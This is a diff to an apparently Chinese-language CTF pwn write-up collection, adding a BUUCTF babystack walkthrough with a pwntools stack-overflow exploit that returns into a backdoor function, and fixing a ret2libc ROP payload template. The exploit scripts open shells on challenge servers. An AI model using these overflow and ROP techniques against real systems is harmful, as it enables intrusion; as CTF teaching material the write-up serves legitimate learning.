@@ -210,6 +210,45 @@ io.interactive()
 
 ------
 
+### [bjdctf_2020_babystack](https://buuoj.cn/challenges#bjdctf_2020_babystack)
+
+先`file ./bjdctf_2020_babystack`查看文件类型再`checksec --file=bjdctf_2020_babystack`检查一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/1.png)
+
+用`IDA Pro 64bit`打开附件`bjdctf_2020_babystack`，按`F5`反汇编源码并查看主函数，发现该函数中有个`buf`变量是`char`型数组，`buf`的长度只有`0x10`，`read()`函数虽然限制了输入到`buf`变量的字节数但是该字节数是由用户输入的`nbytes`变量决定的，当`nbytes`变量是一个足够大的数值时，显然会造成栈溢出。
+
+![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/2.png)
+
+双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x10`个字节占满`buf`变量，然后再加上`r`的`8`个字节。
+
+![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/3.png)
+
+在`Function Window`中注意到有一个名为`backdoor()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`backdoor()`函数的起始地址即可。
+
+![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/4.png)
+
+编写`Python`代码即可得到`flag{0e0d405b-c936-45c4-afc4-947afc46b0a3}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+# io = process('./bjdctf_2020_babystack')
+io = remote('node4.buuoj.cn', 29417)
+e = ELF('./bjdctf_2020_babystack')
+io.sendlineafter(b'Please input the length of your name:', b'100')
+backdoor_address = e.symbols['backdoor'] # 0x4006E6
+log.success('backdoor_address => %s' % hex(backdoor_address))
+payload = b'a'*0x10 + b'fuckpwn!' + p64(backdoor_address)
+io.sendlineafter(b'What\'s u name?', payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/5.png)
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
@@ -623,7 +662,7 @@ payload = b'a'*offset + p32(system_address) + p32(0) + p32(bin_sh_address) #p32(
 # 获取64位版本的got表中的xx函数真实地址,再根据libc中xx函数的偏移地址来算出libc的基址地址
 payload = b'a'*offset + p64(pop_rdi) + p64(e.got['xx']) + p64(e.plt['xx']) + p64(ret_address)
 # 根据libc的基址地址和偏移地址算出system()和'/bin/sh'的真实地址后,构造64位版本的shellcode
-payload = b'a'*offset + p64(ret_address) + p64(pop_rdi) + p64(bin_sh_address)
+payload = b'a'*offset + p64(ret_address) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
 ```
 
 编写`Python`代码即可得到`ctfshow{03a97f04-a802-4c2e-a013-b86a120f034f}`。
@@ -658,7 +697,7 @@ log.success('system_address => %s' % hex(system_address)) # system()函数的地
 bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
 log.success('bin_sh_address => %s' % hex(bin_sh_address))
 pop_ret = 0x4004c6 # ROPgadget --binary ./pwn07 --only "pop|ret"
-payload = b'a'*0xc + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
+payload = b'a'*0xc + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address) 
 io.sendline(payload)
 io.interactive()
 ```
